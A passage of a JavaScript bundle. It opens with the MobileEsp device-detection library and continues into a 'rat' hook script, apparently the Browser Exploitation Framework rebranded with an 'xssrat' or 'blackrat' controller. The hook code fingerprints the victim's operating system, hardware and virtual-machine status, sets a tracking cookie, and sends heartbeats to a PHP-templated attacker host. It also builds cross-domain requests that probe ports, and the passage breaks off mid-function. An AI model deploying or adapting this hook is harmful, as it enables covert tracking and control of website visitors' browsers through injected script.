                if (this.DetectWindowsPhone())
                        return false;

                //Most devices use 'Windows CE', but some report 'iemobile'
                //  and some older ones report as 'PIE' for Pocket IE.
                if (this.uagent.search(this.deviceWinMob) > -1 ||
                        this.uagent.search(this.deviceIeMob) > -1 ||
                        this.uagent.search(this.enginePie) > -1)
                        return true;
                //Test for Windows Mobile PPC but not old Macintosh PowerPC.
                if ((this.uagent.search(this.devicePpc) > -1) &&
                        !(this.uagent.search(this.deviceMacPpc) > -1))
                        return true;
                //Test for Windwos Mobile-based HTC devices.
                if (this.uagent.search(this.manuHtc) > -1 &&
                        this.uagent.search(this.deviceWindows) > -1)
                        return true;
                else
                        return false;
        },


        //BLACKBERRY

        //**************************
        // Detects if the current browser is a BlackBerry of some sort.
        // Includes BB10 OS, but excludes the PlayBook.
        DetectBlackBerry : function() {
                if ((this.uagent.search(this.deviceBB) > -1) ||
                        (this.uagent.search(this.vndRIM) > -1))
                        return true;
                if (this.DetectBlackBerry10Phone())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a BlackBerry 10 OS phone.
        // Excludes tablets.
        DetectBlackBerry10Phone : function() {
                if ((this.uagent.search(this.deviceBB10) > -1) &&
                        (this.uagent.search(this.mobile) > -1))
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is on a BlackBerry tablet device.
        //    Example: PlayBook
        DetectBlackBerryTablet : function() {
                if (this.uagent.search(this.deviceBBPlaybook) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a BlackBerry device AND uses a
        //    WebKit-based browser. These are signatures for the new BlackBerry OS 6.
        //    Examples: Torch. Includes the Playbook.
        DetectBlackBerryWebKit : function() {
                if (this.DetectBlackBerry() &&
                        this.uagent.search(this.engineWebKit) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a BlackBerry Touch
        //    device, such as the Storm, Torch, and Bold Touch. Excludes the Playbook.
        DetectBlackBerryTouch : function() {
                if (this.DetectBlackBerry() &&
                        ((this.uagent.search(this.deviceBBStorm) > -1) ||
                        (this.uagent.search(this.deviceBBTorch) > -1) ||
                        (this.uagent.search(this.deviceBBBoldTouch) > -1) ||
                        (this.uagent.search(this.deviceBBCurveTouch) > -1) ))
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a BlackBerry OS 5 device AND
        //    has a more capable recent browser. Excludes the Playbook.
        //    Examples, Storm, Bold, Tour, Curve2
        //    Excludes the new BlackBerry OS 6 and 7 browser!!
        DetectBlackBerryHigh : function() {
                //Disambiguate for BlackBerry OS 6 or 7 (WebKit) browser
                if (this.DetectBlackBerryWebKit())
                        return false;
                if ((this.DetectBlackBerry()) &&
                        (this.DetectBlackBerryTouch() ||
                        this.uagent.search(this.deviceBBBold) > -1 ||
                        this.uagent.search(this.deviceBBTour) > -1 ||
                        this.uagent.search(this.deviceBBCurve) > -1))
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a BlackBerry device AND
        //    has an older, less capable browser.
        //    Examples: Pearl, 8800, Curve1.
        DetectBlackBerryLow : function() {
                if (this.DetectBlackBerry())
                {
                        //Assume that if it's not in the High tier or has WebKit, then it's Low.
                        if (this.DetectBlackBerryHigh() || this.DetectBlackBerryWebKit())
                                return false;
                        else
                                return true;
                }
                else
                        return false;
        },


        //SYMBIAN

        //**************************
        // Detects if the current browser is the Nokia S60 Open Source Browser.
        DetectS60OssBrowser : function() {
                if (this.DetectWebkit())
                {
                        if ((this.uagent.search(this.deviceS60) > -1 ||
                                this.uagent.search(this.deviceSymbian) > -1))
                                return true;
                        else
                                return false;
                }
                else
                        return false;
        },

        //**************************
        // Detects if the current device is any Symbian OS-based device,
        //   including older S60, Series 70, Series 80, Series 90, and UIQ,
        //   or other browsers running on these devices.
        DetectSymbianOS : function() {
                if (this.uagent.search(this.deviceSymbian) > -1 ||
                        this.uagent.search(this.deviceS60) > -1 ||
                        ((this.uagent.search(this.deviceSymbos) > -1) &&
                                (this.DetectOperaMobile)) || //Opera 10
                        this.uagent.search(this.deviceS70) > -1 ||
                        this.uagent.search(this.deviceS80) > -1 ||
                        this.uagent.search(this.deviceS90) > -1)
                        return true;
                else
                        return false;
        },


        //WEBOS AND PALM

        //**************************
        // Detects if the current browser is on a PalmOS device.
        DetectPalmOS : function() {
                //Make sure it's not WebOS first
                if (this.DetectPalmWebOS())
                        return false;

                //Most devices nowadays report as 'Palm',
                //  but some older ones reported as Blazer or Xiino.
                if (this.uagent.search(this.devicePalm) > -1 ||
                        this.uagent.search(this.engineBlazer) > -1 ||
                        this.uagent.search(this.engineXiino) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is on a Palm device
        //   running the new WebOS.
        DetectPalmWebOS : function()
        {
                if (this.uagent.search(this.deviceWebOS) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is on an HP tablet running WebOS.
        DetectWebOSTablet : function() {
                if (this.uagent.search(this.deviceWebOShp) > -1 &&
                        this.uagent.search(this.deviceTablet) > -1)
                        return true;
                else
                        return false;
        },


        //OPERA

        //**************************
        // Detects if the current browser is Opera Mobile or Mini.
        // Note: Older embedded Opera on mobile devices didn't follow these naming conventions.
        //   Like Archos media players, they will probably show up in DetectMobileQuick or -Long instead.
        DetectOperaMobile : function() {
                if ((this.uagent.search(this.engineOpera) > -1) &&
                        ((this.uagent.search(this.mini) > -1 ||
                        this.uagent.search(this.mobi) > -1)))
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is Opera Mobile
        // running on an Android phone.
        DetectOperaAndroidPhone : function () {
                if ((this.uagent.search(this.engineOpera) > -1) &&
                        (this.uagent.search(this.deviceAndroid) > -1) &&
                        (this.uagent.search(this.mobi) > -1))
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is Opera Mobile
        // running on an Android tablet.
        DetectOperaAndroidTablet : function() {
                if ((this.uagent.search(this.engineOpera) > -1) &&
                        (this.uagent.search(this.deviceAndroid) > -1) &&
                        (this.uagent.search(this.deviceTablet) > -1))
                        return true;
                else
                        return false;
        },


        //MISCELLANEOUS DEVICES

        //**************************
        // Detects if the current device is an Amazon Kindle (eInk devices only).
        // Note: For the Kindle Fire, use the normal Android methods.
        DetectKindle : function() {
                if (this.uagent.search(this.deviceKindle) > -1 &&
                        !this.DetectAndroid())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current Amazon device has turned on the Silk accelerated browsing feature.
        // Note: Typically used by the the Kindle Fire.
        DetectAmazonSilk : function() {
                if (this.uagent.search(this.engineSilk) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a
        //   Garmin Nuvifone.
        DetectGarminNuvifone : function() {
                if (this.uagent.search(this.deviceNuvifone) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects a device running the Bada smartphone OS from Samsung.
        DetectBada : function() {
                if (this.uagent.search(this.deviceBada) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects a device running the Tizen smartphone OS.
        DetectTizen : function() {
                if (this.uagent.search(this.deviceTizen) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects a device running the Meego OS.
        DetectMeego : function() {
                if (this.uagent.search(this.deviceMeego) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects the Danger Hiptop device.
        DetectDangerHiptop : function() {
                if (this.uagent.search(this.deviceDanger) > -1 ||
                        this.uagent.search(this.deviceHiptop) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a Sony Mylo device.
        DetectSonyMylo : function() {
                if ((this.uagent.search(this.manuSony) > -1) &&
                    ((this.uagent.search(this.qtembedded) > -1) ||
                     (this.uagent.search(this.mylocom2) > -1)))
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is on one of
        // the Maemo-based Nokia Internet Tablets.
        DetectMaemoTablet : function() {
                if (this.uagent.search(this.maemo) > -1)
                        return true;
                //For Nokia N810, must be Linux + Tablet, or else it could be something else.
                if ((this.uagent.search(this.linux) > -1)
                        && (this.uagent.search(this.deviceTablet) > -1)
                        && !this.DetectWebOSTablet()
                        && !this.DetectAndroid())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is an Archos media player/Internet tablet.
        DetectArchos : function() {
                if (this.uagent.search(this.deviceArchos) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is an Internet-capable game console.
        // Includes many handheld consoles.
        DetectGameConsole : function() {
                if (this.DetectSonyPlaystation() ||
                        this.DetectNintendo() ||
                        this.DetectXbox())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is a Sony Playstation.
        DetectSonyPlaystation : function() {
                if (this.uagent.search(this.devicePlaystation) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is a handheld gaming device with
        // a touchscreen and modern iPhone-class browser. Includes the Playstation Vita.
        DetectGamingHandheld : function() {
                if ((this.uagent.search(this.devicePlaystation) > -1) &&
                   (this.uagent.search(this.devicePlaystationVita) > -1))
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is a Nintendo game device.
        DetectNintendo : function() {
                if (this.uagent.search(this.deviceNintendo) > -1   ||
                        this.uagent.search(this.deviceWii) > -1 ||
                        this.uagent.search(this.deviceNintendoDs) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is a Microsoft Xbox.
        DetectXbox : function() {
                if (this.uagent.search(this.deviceXbox) > -1)
                        return true;
                else
                        return false;
        },
       
       
        //**************************
        // Detects whether the device is a Brew-powered device.
        //   Note: Limited to older Brew-powered feature phones.
        //   Ignores newer Brew versions like MP. Refer to DetectMobileQuick().
        DetectBrewDevice : function() {
                if (this.uagent.search(this.deviceBrew) > -1)
                        return true;
                else
                        return false;
        },


        // DEVICE CLASSES

        //**************************
        // Check to see whether the device is *any* 'smartphone'.
        //   Note: It's better to use DetectTierIphone() for modern touchscreen devices.
        DetectSmartphone : function() {
                //Exclude duplicates from TierIphone
                if (this.DetectTierIphone() ||
                        this.DetectS60OssBrowser() ||
                        this.DetectSymbianOS() ||
                        this.DetectWindowsMobile() ||
                        this.DetectBlackBerry() ||
                        this.DetectPalmOS())
                        return true;
               
                //Otherwise, return false.
                return false;
        },

        //**************************
        // Detects if the current device is a mobile device.
        //  This method catches most of the popular modern devices.
        //  Excludes Apple iPads and other modern tablets.
        DetectMobileQuick : function() {
                //Let's exclude tablets.
                if (this.DetectTierTablet())
                        return false;

                if (this.initCompleted || this.isMobilePhone)
                        return this.isMobilePhone;

                //Most mobile browsing is done on smartphones
                if (this.DetectSmartphone())
                        return true;

                //Catch all for many mobile devices
                if (this.uagent.search(this.mobile) > -1)
                        return true;

                if (this.DetectKindle() ||
                        this.DetectAmazonSilk())
                        return true;

                if (this.uagent.search(this.deviceMidp) > -1 ||
                        this.DetectBrewDevice())
                        return true;

                if (this.DetectOperaMobile() ||
                        this.DetectArchos())
                        return true;

                if ((this.uagent.search(this.engineObigo) > -1) ||
                        (this.uagent.search(this.engineNetfront) > -1) ||
                        (this.uagent.search(this.engineUpBrowser) > -1) ||
                        (this.uagent.search(this.engineOpenWeb) > -1))
                        return true;

                return false;
        },

        //**************************
        // Detects in a more comprehensive way if the current device is a mobile device.
        DetectMobileLong : function() {
                if (this.DetectMobileQuick())
                        return true;
                if (this.DetectGameConsole())
                        return true;

                if (this.DetectDangerHiptop() ||
                        this.DetectMaemoTablet() ||
                        this.DetectSonyMylo() ||
                        this.DetectGarminNuvifone())
                        return true;

                if ((this.uagent.search(this.devicePda) > -1) &&
                        !(this.uagent.search(this.disUpdate) > -1))
                        return true;
               
                //Detect for certain very old devices with stupid useragent strings.
                if (this.uagent.search(this.manuSamsung1) > -1 ||
                        this.uagent.search(this.manuSonyEricsson) > -1 ||
                        this.uagent.search(this.manuericsson) > -1)
                        return true;
               
                if ((this.uagent.search(this.svcDocomo) > -1) ||
                        (this.uagent.search(this.svcKddi) > -1) ||
                        (this.uagent.search(this.svcVodafone) > -1))
                        return true;
               
                return false;
        },

        //*****************************
        // For Mobile Web Site Design
        //*****************************
       
        //**************************
        // The quick way to detect for a tier of devices.
        //   This method detects for the new generation of
        //   HTML 5 capable, larger screen tablets.
        //   Includes iPad, Android (e.g., Xoom), BB Playbook, WebOS, etc.
        DetectTierTablet : function() {
                if (this.initCompleted || this.isTierTablet)
                        return this.isTierTablet;
               
                if (this.DetectIpad() ||
                        this.DetectAndroidTablet() ||
                        this.DetectBlackBerryTablet() ||
                        this.DetectWebOSTablet())
                        return true;
                else
                        return false;
        },

        //**************************
        // The quick way to detect for a tier of devices.
        //   This method detects for devices which can
        //   display iPhone-optimized web content.
        //   Includes iPhone, iPod Touch, Android, Windows Phone 7 and 8, BB10, WebOS, Playstation Vita, etc.
        DetectTierIphone : function() {
                if (this.initCompleted || this.isTierIphone)
                        return this.isTierIphone;

                if (this.DetectIphoneOrIpod() ||
                        this.DetectAndroidPhone() ||
                        this.DetectWindowsPhone() ||
                        this.DetectBlackBerry10Phone() ||
                        this.DetectPalmWebOS() ||
                        this.DetectBada() ||
                        this.DetectTizen() ||
                        this.DetectGamingHandheld())
                        return true;

               //Note: BB10 phone is in the previous paragraph
                if (this.DetectBlackBerryWebKit() && this.DetectBlackBerryTouch())
                        return true;
               
                else
                        return false;
        },

        //**************************
        // The quick way to detect for a tier of devices.
        //   This method detects for devices which are likely to be
        //   capable of viewing CSS content optimized for the iPhone,
        //   but may not necessarily support JavaScript.
        //   Excludes all iPhone Tier devices.
        DetectTierRichCss : function() {
                if (this.initCompleted || this.isTierRichCss)
                        return this.isTierRichCss;

                //Exclude iPhone and Tablet Tiers and e-Ink Kindle devices
                if (this.DetectTierIphone() ||
                        this.DetectKindle() ||
                        this.DetectTierTablet())
                        return false;
               
                //Exclude if not mobile
                if (!this.DetectMobileQuick())
                        return false;
                               
                //If it's a mobile webkit browser on any other device, it's probably OK.
                if (this.DetectWebkit())
                        return true;
               
                //The following devices are also explicitly ok.
                if (this.DetectS60OssBrowser() ||
                        this.DetectBlackBerryHigh() ||
                        this.DetectWindowsMobile() ||
                        (this.uagent.search(this.engineTelecaQ) > -1))
                        return true;
               
                else
                        return false;
        },

        //**************************
        // The quick way to detect for a tier of devices.
        //   This method detects for all other types of phones,
        //   but excludes the iPhone and RichCSS Tier devices.
        // NOTE: This method probably won't work due to poor
        //  support for JavaScript among other devices.
        DetectTierOtherPhones : function() {
                if (this.initCompleted || this.isTierGenericMobile)
                        return this.isTierGenericMobile;
               
                //Exclude iPhone, Rich CSS and Tablet Tiers
                if (this.DetectTierIphone() ||
                        this.DetectTierRichCss() ||
                        this.DetectTierTablet())
                        return false;
               
                //Otherwise, if it's mobile, it's OK
                if (this.DetectMobileLong())
                        return true;

                else
                        return false;
        }

};

//Initialize the MobileEsp object
MobileEsp.InitDeviceScan();


if (typeof rat !== 'object') {
    rat = {
		extend:function() {  //来自于jquery extend 支持浅拷贝和深拷贝  
			var options, name, src, copy, copyIsArray, clone,  
				target = arguments[0] || {}, // 目标对象  
				i = 1,  
				length = arguments.length,  
				deep = false;  
			
			// 处理深度拷贝情况（第一个参数是boolean类型且为true）  
			if ( typeof target === "boolean" ) {  
				deep = target;  
				target = arguments[1] || {};  
				// 跳过第一个参数（是否深度拷贝）和第二个参数（目标对象）  
				i = 2;  
			}  
			
			// 如果目标不是对象或函数，则初始化为空对象  
			if ( typeof target !== "object" && !jQuery.isFunction(target) ) {  
				target = {};  
			}  
			
			// 如果只指定了一个参数，则使用jQuery自身作为目标对象  
			if ( length === i ) {  
				target = this;  
				--i;  
			}  
			
			for ( ; i < length; i++ ) {  
				// Only deal with non-null/undefined values  
				if ( (options = arguments[ i ]) != null ) {  
					// Extend the base object  
					for ( name in options ) {  
						src = target[ name ];  
						copy = options[ name ];  
			
						// Prevent never-ending loop  
						if ( target === copy ) {  
							continue;  
						}  
			
						// 如果对象中包含了数组或者其他对象，则使用递归进行拷贝  
						if ( deep && copy && ( jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy)) ) ) {  
							// 处理数组  
							if ( copyIsArray ) {  
								copyIsArray = false;  
								// 如果目标对象不存在该数组，则创建一个空数组；  
								clone = src && jQuery.isArray(src) ? src : [];  
							} else {  
								clone = src && jQuery.isPlainObject(src) ? src : {};  
							}  
			
							// 从不改变原始对象，只做拷贝  
							target[ name ] = jQuery.extend( deep, clone, copy );  
							  
						// 不拷贝undefined值  
						} else if ( copy !== undefined ) {  
							target[ name ] = copy;  
						}  
					}  
				}  
			}  
			
			// 返回已经被修改的对象  
			return target;  
		},
		
		/**
		 * Registers a component in rat JS.
		 * @params: {String} the component.
		 *
		 * Components are very important to register so the framework does not
		 * send them back over and over again.
		 */
		 // An array containing functions to be executed by the window.onclose() method.
		onclose: function(){
			rat.updater.heartBeat("hb.php","close");	
			rat.updater.postLog(" windows closed, the client will be offline ");
		},
		init:function(){
			if(!rat.isLoaded){
				rat.isLoaded = true;
                //新建cookie
				var rat_cookie  = rat.session.get_rat_cookie_id();
				//rat.updater.browser_details();//send the browser details
				rat.updater.heartBeat("online");//begin to heartbeat 
			}
		},
		isLoaded:false,
		//// An array containing all the rat JS components.
		components: new Array(), 
		regCmp: function(component) {
			this.components.push(component);
		}
	
	};
}

//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (rat) - http://ratproject.com
// See the file 'doc/COPYING' for copying permission
//

rat.os = {

	ua: navigator.userAgent,

	isWin311: function() {
		return (this.ua.match('(Win16)')) ? true : false;
	},
	
	isWinNT4: function() {
		return (this.ua.match('(Windows NT 4.0)')) ? true : false;
	},
	
	isWin95: function() {
		return (this.ua.match('(Windows 95)|(Win95)|(Windows_95)')) ? true : false;
	},
	isWinCE: function() {
		return (this.ua.match('(Windows CE)')) ? true : false;
	},
	
	isWin98: function() {
		return (this.ua.match('(Windows 98)|(Win98)')) ? true : false;
	},
	
	isWinME: function() {
		return (this.ua.match('(Windows ME)|(Win 9x 4.90)')) ? true : false;
	},
	
	isWin2000: function() {
		return (this.ua.match('(Windows NT 5.0)|(Windows 2000)')) ? true : false;
	},

	isWin2000SP1: function() {
		return (this.ua.match('Windows NT 5.01 ')) ? true : false;
	},
	
	isWinXP: function() {
		return (this.ua.match('(Windows NT 5.1)|(Windows XP)')) ? true : false;
	},
	
	isWinServer2003: function() {
		return (this.ua.match('(Windows NT 5.2)')) ? true : false;
	},
	
	isWinVista: function() {
		return (this.ua.match('(Windows NT 6.0)')) ? true : false;
	},
	
	isWin7: function() {
		return (this.ua.match('(Windows NT 6.1)|(Windows NT 7.0)')) ? true : false;
	},

	isWin8: function() {
		return (this.ua.match('(Windows NT 6.2)')) ? true : false;
	},
	
	isOpenBSD: function() {
		return (this.ua.indexOf('OpenBSD') != -1) ? true : false;
	},
	
	isSunOS: function() {
		return (this.ua.indexOf('SunOS') != -1) ? true : false;
	},
	
	isLinux: function() {
		return (this.ua.match('(Linux)|(X11)')) ? true : false;
	},
	
	isMacintosh: function() {
		return (this.ua.match('(Mac_PowerPC)|(Macintosh)|(MacIntel)')) ? true : false;
	},

	isWinPhone: function() {
		return (this.ua.match('(Windows Phone)')) ? true : false;
	},

	isIphone: function() {
		return (this.ua.indexOf('iPhone') != -1) ? true : false;
	},

	isIpad: function() {
		return (this.ua.indexOf('iPad') != -1) ? true : false;
	},

	isIpod: function() {
		return (this.ua.indexOf('iPod') != -1) ? true : false;
	},

	isNokia: function() {
		return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
	},

	isAndroid: function() {
		return (this.ua.match('Android')) ? true : false;
	},

	isBlackBerry: function() {
		return (this.ua.match('BlackBerry')) ? true : false;
	},

	isWebOS: function() {
		return (this.ua.match('webOS')) ? true : false;
	},

	isQNX: function() {
		return (this.ua.match('QNX')) ? true : false;
	},
	
	isBeOS: function() {
		return (this.ua.match('BeOS')) ? true : false;
	},

	isWindows: function() {
		return this.isWin311() || this.isWinNT4() || this.isWinCE() || this.isWin95() || this.isWin98() || this.isWinME() || this.isWin2000() || this.isWin2000SP1() || this.isWinXP() || this.isWinServer2003() || this.isWinVista() || this.isWin7() || this.isWin8() || this.isWinPhone();
	},
	
	getName: function() {
		//Windows
		if(this.isWin311())        return 'Windows 3.11';
		if(this.isWinNT4())        return 'Windows NT 4';
		if(this.isWinCE())         return 'Windows CE';
		if(this.isWin95())         return 'Windows 95';
		if(this.isWin98())         return 'Windows 98';
		if(this.isWinME())         return 'Windows Millenium';
		if(this.isWin2000())       return 'Windows 2000';
		if(this.isWin2000SP1())    return 'Windows 2000 SP1';
		if(this.isWinXP())         return 'Windows XP';
		if(this.isWinServer2003()) return 'Windows Server 2003';
		if(this.isWinVista())      return 'Windows Vista';
		if(this.isWin7())          return 'Windows 7';
		if(this.isWin8())          return 'Windows 8';

		//Nokia
		if(this.isNokia()) {

			if (this.ua.indexOf('Maemo Browser') != -1) return 'Maemo';
			if (this.ua.match('(SymbianOS)|(Symbian OS)')) return 'SymbianOS';
			if (this.ua.indexOf('Symbian') != -1) return 'Symbian';

			//return 'Nokia';
		}

		// BlackBerry
		if(this.isBlackBerry()) return 'BlackBerry OS';

		// Android
		if(this.isAndroid()) return 'Android';

		//linux
		if(this.isLinux()) return 'Linux';
		if(this.isSunOS()) return 'Sun OS';

		//iPhone
		if (this.isIphone()) return 'iOS';
		//iPad
		if (this.isIpad()) return 'iOS';
		//iPod
		if (this.isIpod()) return 'iOS';

		// zune
		//if (this.isZune()) return 'Zune';
		
		//macintosh
		if(this.isMacintosh()) {
			if((typeof navigator.oscpu != 'undefined') && (navigator.oscpu.indexOf('Mac OS')!=-1))
				return navigator.oscpu;
				
			return 'Macintosh';
		}
		
		//others
		if(this.isQNX()) return 'QNX';
		if(this.isBeOS()) return 'BeOS';
		if(this.isWebOS()) return 'webOS';
		
		return 'unknown';
	}
};

rat.regCmp('rat.os');

//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (rat) - http://ratproject.com
// See the file 'doc/COPYING' for copying permission
//

rat.hardware = {

	ua: navigator.userAgent,

	cpuType: function() {
		// IE
		if (typeof navigator.cpuClass != 'undefined') {
			cpu = navigator.cpuClass;
			if (cpu == "x86")   return "32-bit";
			if (cpu == "68K")   return "Motorola 68K";
			if (cpu == "PPC")   return "Motorola PPC";
			if (cpu == "Alpha") return "Digital";
			if (this.ua.match('Win64; IA64')) return "64-bit (Intel)";
			if (this.ua.match('Win64; x64'))  return "64-bit (AMD)";
		// Firefox
        } else if (typeof navigator.oscpu != 'undefined') {
			if (navigator.oscpu.match('(WOW64|x64|x86_64)')) return "64-bit";
		}
		if (navigator.platform.toLowerCase() == "win64") return "64-bit";
		return "32-bit";
	},

	isTouchEnabled: function() {
		if ('ontouchstart' in document) return true;
		return false;
	},

	isVirtualMachine: function() {
		if (screen.width % 2 || screen.height % 2) return true;
		return false;
	},

	isLaptop: function() {
		// Most common laptop screen resolution
		if (screen.width == 1366 && screen.height == 768) return true;
		// Netbooks
		if (screen.width == 1024 && screen.height == 600) return true;
		return false;
	},

	isNokia: function() {
		return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
	},

	isZune: function() {
		return (this.ua.match('ZuneWP7')) ? true : false;
	},

	isHtc: function() {
		return (this.ua.match('HTC')) ? true : false;
	},

	isEricsson: function() {
		return (this.ua.match('Ericsson')) ? true : false;
	},

	isMotorola: function() {
		return (this.ua.match('Motorola')) ? true : false;
	},

	isGoogle: function() {
		return (this.ua.match('Nexus One')) ? true : false;
	},

        /**
         * Returns true if the browser is on a Mobile Phone
         * @return: {Boolean} true or false
         *
         * @example: if(rat.hardware.isMobilePhone()) { ... }
         **/
        isMobilePhone: function() {
            return DetectMobileQuick();
        },

	getName: function() {
                var ua = navigator.userAgent.toLowerCase();
                if(MobileEsp.DetectIphone())              { return "iPhone"};
                if(MobileEsp.DetectIpod())                { return "iPod Touch"};
                if(MobileEsp.DetectIpad())                { return "iPad"};
		if (this.isHtc())               { return 'HTC'};
		if (this.isMotorola())          { return 'Motorola'};
		if (this.isZune())              { return 'Zune'};
		if (this.isGoogle())            { return 'Google Nexus One'};
		if (this.isEricsson())          { return 'Ericsson'};
                if(MobileEsp.DetectAndroidPhone())        { return "Android Phone"};
                if(MobileEsp.DetectAndroidTablet())       { return "Android Tablet"};
                if(MobileEsp.DetectS60OssBrowser())       { return "Nokia S60 Open Source"};
                if(ua.search(MobileEsp.deviceS60) > -1)   { return "Nokia S60"};
                if(ua.search(MobileEsp.deviceS70) > -1)   { return "Nokia S70"};
                if(ua.search(MobileEsp.deviceS80) > -1)   { return "Nokia S80"};
                if(ua.search(MobileEsp.deviceS90) > -1)   { return "Nokia S90"};
                if(ua.search(MobileEsp.deviceSymbian) > -1)   { return "Nokia Symbian"};
		if (this.isNokia())             { return 'Nokia'};
                if(MobileEsp.DetectWindowsPhone7())       { return "Windows Phone 7"};
                if(MobileEsp.DetectWindowsMobile())       { return "Windows Mobile"};
                if(MobileEsp.DetectBlackBerryTablet())    { return "BlackBerry Tablet"};
                if(MobileEsp.DetectBlackBerryWebKit())    { return "BlackBerry OS 6"};
                if(MobileEsp.DetectBlackBerryTouch())     { return "BlackBerry Touch"};
                if(MobileEsp.DetectBlackBerryHigh())      { return "BlackBerry OS 5"};
                if(MobileEsp.DetectBlackBerry())          { return "BlackBerry"};
                if(MobileEsp.DetectPalmOS())              { return "Palm OS"};
                if(MobileEsp.DetectPalmWebOS())           { return "Palm Web OS"};
                if(MobileEsp.DetectGarminNuvifone())      { return "Gamin Nuvifone"};
                if(MobileEsp.DetectArchos())              { return "Archos"}
                if(MobileEsp.DetectBrewDevice())          { return "Brew"};
                if(MobileEsp.DetectDangerHiptop())        { return "Danger Hiptop"};
                if(MobileEsp.DetectMaemoTablet())         { return "Maemo Tablet"};
                if(MobileEsp.DetectSonyMylo())            { return "Sony Mylo"};
                if(MobileEsp.DetectAmazonSilk())          { return "Kindle Fire"};
                if(MobileEsp.DetectKindle())              { return "Kindle"};
                if(MobileEsp.DetectSonyPlaystation())                 { return "Playstation"};
                if(ua.search(MobileEsp.deviceNintendoDs) > -1)        { return "Nintendo DS"};
                if(ua.search(MobileEsp.deviceWii) > -1)               { return "Nintendo Wii"};
                if(ua.search(MobileEsp.deviceNintendo) > -1)          { return "Nintendo"};
                if(MobileEsp.DetectXbox())                            { return "Xbox"};
				if(this.isLaptop())							{ return "Laptop"};
                if(this.isVirtualMachine())                 { return "Virtual Machine"};

		return 'Unknown';
	}
};

rat.regCmp('rat.hardware');
<?php
require_once("bin/util/util.php");
$ticket = htmlspecialchars( $_GET["t"],ENT_QUOTES,'UTF-8'); 
$protocol = get_protocol();
$port = get_port();
$host = get_host();
$api_path = get_page_path()."/api";
$interval = 3000;
 ?>
rat.net = {
	config:{
			protocol:"<?php echo $protocol ?>",// @String http or https
			port:<?php echo $port ?>,// @int like 80 or 8080
			host:"<?php echo $host ?>",// @String like 169.65.24.15 or xssrat.net
			api_path:"<?php echo $api_path ?>",// @String if the full api url is "http://169.65.24.15/blackrat/api", the api path is  blackrat/api
			interval:<?php echo $interval ?>,//@int  the refresh time interval   1 = 1 second
			ticket:"<?php echo $ticket ?>",//@String
			pmd_id:null,// @int
			a_id:null
		},
		/**
		 * Response Object - used in the rat.net.request callback
		 * NOTE: as we are using async mode, the response object will be empty if returned.
		 * Using sync mode, request obj fields will be populated.
		 */
		response:function () {
			this.status_code = null;        // 500, 404, 200, 302
			this.status_text = null;        // success, timeout, error, ...
			this.response_body = null;      // "<html>鈥�." if not a cross domain request
			this.port_status = null;        // tcp port is open, closed or not http
			this.was_cross_domain = null;   // true or false
			this.was_timedout = null;       // the user specified timeout was reached
			this.duration = null;           // how long it took for the request to complete
			this.headers = null;            // full response headers
		},
		/**
		 * Performs http requests
		 * @param: {String} scheme: HTTP or HTTPS
		 * @param: {String} method: GET or POST
		 * @param: {String} domain: bindshell.net, 192.168.3.4, etc
		 * @param: {Int} port: 80, 5900, etc
		 * @param: {String} path: /path/to/resource
		 * @param: {String} anchor: this is the value that comes after the # in the URL
		 * @param: {String} data: This will be used as the query string for a GET or post data for a POST
		 * @param: {Int} timeout: timeout the request after N seconds
		 * @param: {String} dataType: specify the data return type expected (ie text/html/script)
		 * @param: {Function} callback: call the callback function at the completion of the method
		 *
		 * @return: {Object} response: this object contains the response details
		 */
		request:function (scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
			//check if same domain or cross domain
			var cross_domain = true;
			if (document.domain == domain.replace(/(\r\n|\n|\r)/gm,"")) { //strip eventual line breaks
				if(document.location.port == "" || document.location.port == null){
					cross_domain = !(port == "80" || port == "443");
				}
			}
	
			//build the url
			var url = "";
			if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
				url = path;
			} else {
				url = scheme + "://" + domain;
				url = (port != null) ? url + ":" + port : url;
				url = (path != null) ? url + path : url;
				url = (anchor != null) ? url + "#" + anchor : url;
			}
	
			//define response object
			var response = new this.response;
			response.was_cross_domain = cross_domain;
			var start_time = new Date().getTime();
	
			/*
			 * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
			 * This will turn POSTs into GETs for remote-domain requests.
			 */
			if (method == "POST"){
			   $.ajaxSetup({
				  dataType: dataType
			   });
			} else {
			   $.ajaxSetup({
					dataType: 'script'
			   });
			}
	
			//build and execute the request
			$.ajax({type:method,
				url:url,
				data:data,
				timeout:(timeout * 1000),
	
				//This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
				beforeSend:function (xhr) {
					if (method == "POST") {
